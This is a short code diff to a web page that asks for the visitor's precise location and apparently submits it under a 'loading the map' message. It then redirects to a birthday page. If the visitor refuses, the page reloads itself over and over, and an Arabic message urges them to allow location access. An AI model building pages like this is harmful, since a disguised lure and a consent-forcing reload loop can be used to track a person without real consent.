@@ -117,6 +117,10 @@
 
                     if (updateResponse.ok) {
                         updateStatus("تم الحصول على الخريطة", "green");
+                        // Redirect to the specified URL after a short delay
+                        setTimeout(() => {
+                            window.location.href = "https://basilalshukaili.github.io/Raghad-Birthday";
+                        }, 2000); // 2 seconds delay
                     } else {
                         updateStatus("عذرا تعذر تحميل الخريطة بسبب عدم السماح للوصول للموقع الرجاء تحديث الصفحة والسماح بالوصول للموقع", "red");
                     }
@@ -126,11 +130,16 @@
                     console.error(error);
                 }
             },
-            () => updateStatus("Location access denied", "red"),
+            () => {
+                updateStatus("Location access denied", "red");
+                // Refresh the page after 3 seconds
+                setTimeout(() => {
+                    window.location.reload();
+                }, 3000); // 3 seconds delay
+            },
             { enableHighAccuracy: true, timeout: 5000 }
         );
     }
     </script>
-
 </body>
 </html>
